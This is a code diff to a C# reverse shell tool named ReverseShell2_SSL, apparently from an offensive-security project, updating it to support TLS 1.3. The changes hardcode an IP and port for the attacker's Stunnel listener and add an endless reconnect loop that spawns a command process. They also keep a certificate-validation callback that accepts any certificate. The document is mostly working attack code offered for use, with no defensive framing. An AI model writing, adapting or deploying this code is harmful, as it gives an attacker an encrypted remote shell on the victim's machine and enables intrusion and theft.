@@ -12,6 +12,7 @@ using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography.X509Certificates;
 using System.Net.Security;
+using System.Security.Authentication;
 
 namespace ReverseShell2_SSL
 {
@@ -38,50 +39,24 @@ namespace ReverseShell2_SSL
 /\__/ / | | |_| | | | | | | |  __/ | | |\ \  __/\ V / (   / | | |  __/ | |
 \____/  \_/\__,_|_| |_|_| |_|\___|_| \_| \_\___| \_/   |_||_| |_|\___|_|_|
                                                                           
-ver 1.0 Coded by GuerraIT                               
-
-                
-            ");
-
-
-            
-            Console.WriteLine(@"Starting decoding, please wait...");
-            Thread.Sleep(3000);
-
-            ReverseShell_SSL rS;
-            //check if there is the config file
-            string configF = "config";
-
-            if (File.Exists (configF)) {
-
-                string ip, port, cn_name;
-                try
-                {
-                    //read param in config
-                    string[] lines = File.ReadAllLines(configF);
-
-                    ip = lines[0].Split(':')[1];
-                    port = lines[1].Split(':')[1];
-                    cn_name = lines[2].Split(':')[1];
+ver 1.0 Coded by GuerraIT
+ver 1.1 Modified by Zinzloun (support TLS 1.3)                           
+	");
 
 
-                    //spawn the reverse shell
-                    rS = new ReverseShell_SSL(ip, Int32.Parse(port), cn_name);
-                }
-                catch (Exception) {
+            //CONFIG THIS: point to the Stunell server
+            string IP = "192.168.1.2";
+            int PORT = 9999;
 
-                    Console.WriteLine(@"An error occured decoding the file: param reading: check the config file. Procudere aborted");
-                    Thread.Sleep(5000);
-                }
-            }
-            //no config file
-            else {
-                Console.WriteLine(@"An error occured: missing config file. Procudere aborted");
-                Thread.Sleep(5000);
-            }
-         }
+            Console.WriteLine("Using the following connection " + IP + ":" + PORT);
 
-        
+            //spawn the reverse shell
+            ReverseShell_SSL rsss = new ReverseShell_SSL(IP, PORT);
+
+
+        }
+
+
     }
 
     class ReverseShell_SSL
@@ -95,18 +70,19 @@ ver 1.0 Coded by GuerraIT
         Process processCmd;
         StringBuilder strInput;
 
-        public ReverseShell_SSL(string RHost,Int32 Port, string CN) {
+        public ReverseShell_SSL(string RHost, Int32 Port)
+        {
 
             for (; ; )
             {
-                RunServer(RHost,Port,CN);
-                Thread.Sleep(3000); //Wait 3 seconds
+                RunServer(RHost, Port);
+                Thread.Sleep(3000); //Wait 3 seconds and retry
             }
 
         }
 
 
-        private void RunServer(string rhost, Int32 port, string CN)
+        private void RunServer(string rhost, Int32 port)
         {
             tcpClient = new TcpClient();
             strInput = new StringBuilder();
@@ -123,9 +99,12 @@ ver 1.0 Coded by GuerraIT
                         new RemoteCertificateValidationCallback(ValidateServerCertificate),
                         null
                         );
-                    // The server name must match the name on the server certificate (CN value)
-                    sslStream.AuthenticateAsClient(CN);
-
+                    // Since we are not validating the certificate, we can pass as CN whatever we like (here host.local).
+                    // Otherwise the value must match the CN of STunnel's certificate
+                    sslStream.AuthenticateAsClient("host.local",
+                         new X509CertificateCollection(),
+                         SslProtocols.Tls13,
+                         false);
                     DisplayCertificateInformation(sslStream);
 
                     //networkStream = tcpClient.GetStream();
@@ -205,7 +184,7 @@ ver 1.0 Coded by GuerraIT
               X509Chain chain,
               SslPolicyErrors sslPolicyErrors)
         {
-            
+
 
             // validate all the certificate
             return true;
